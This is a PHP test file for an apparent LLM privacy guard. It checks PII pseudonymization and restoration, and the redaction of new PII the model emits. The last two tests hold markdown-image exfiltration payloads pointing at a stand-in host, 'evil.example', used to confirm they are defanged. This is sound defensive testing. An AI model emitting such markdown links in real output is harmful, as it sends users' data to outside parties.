<?php

declare(strict_types=1);

use Sellinnate\Warden\Facades\Warden;
use Sellinnate\Warden\Support\Vault;

/**
 * The headline end-to-end flow (spec §7.7): PII is pseudonymized on input,
 * the LLM works on de-identified text, and the output is de-anonymized for the
 * user — while NEW PII/secrets the model emits are still caught.
 */
it('pseudonymizes on input and de-anonymizes on output', function () {
    config()->set('warden.pii.operators', [
        'IT_FISCAL_CODE' => ['op' => 'encrypt'],
        'EMAIL_ADDRESS' => ['op' => 'encrypt'],
        'default' => ['op' => 'replace'],
    ]);

    $userText = 'Il mio codice fiscale è RSSMRA80A01H501U e la mail è mario@example.com';

    $input = Warden::sanitize($userText);

    // Sent to the LLM: de-identified, with stable placeholders.
    expect($input->sanitizedText)->not->toContain('RSSMRA80A01H501U')
        ->and($input->sanitizedText)->toContain('<IT_FISCAL_CODE_1>')
        ->and($input->vault)->not->toBeNull();

    // Simulate the LLM echoing the placeholders back in its answer.
    $llmReply = 'Ho registrato il codice <IT_FISCAL_CODE_1> con email <EMAIL_ADDRESS_1>.';

    $output = Warden::inspectOutput($llmReply, vault: $input->vault);

    // The user gets their real data back.
    expect($output->sanitizedText)->toContain('RSSMRA80A01H501U')
        ->and($output->sanitizedText)->toContain('mario@example.com')
        ->and($output->blocked())->toBeFalse();
});

it('still redacts NEW pii the model invents, before restoring the user values', function () {
    config()->set('warden.pii.operators', [
        'IT_FISCAL_CODE' => ['op' => 'encrypt'],
        'default' => ['op' => 'replace'],
    ]);

    $input = Warden::sanitize('CF RSSMRA80A01H501U');

    // The model leaks a DIFFERENT person's email (new PII) plus echoes the placeholder.
    $reply = 'Contact leaked@victim.com about <IT_FISCAL_CODE_1>.';
    $output = Warden::inspectOutput($reply, vault: $input->vault);

    expect($output->sanitizedText)->toContain('RSSMRA80A01H501U')  // user's own data restored
        ->and($output->sanitizedText)->not->toContain('leaked@victim.com'); // new leak redacted
});

it('defangs markdown exfiltration in the output', function () {
    $reply = 'Result: ![x](https://evil.example/collect?d=stolen)';
    $output = Warden::inspectOutput($reply);

    expect($output->sanitizedText)->not->toContain('evil.example');
});

it('defangs markdown that a restored vault value re-introduces (review M5)', function () {
    $vault = new Vault;
    // A reversible free-text value that contains a markdown exfil payload.
    $ph = $vault->store('NOTE', '![pwn](https://evil.example/a.png)');

    $output = Warden::inspectOutput("Your note: {$ph}", vault: $vault);

    // Deanonymize runs first, then markdown-defang neutralizes the restored URL.
    expect($output->sanitizedText)->not->toContain('evil.example');
});
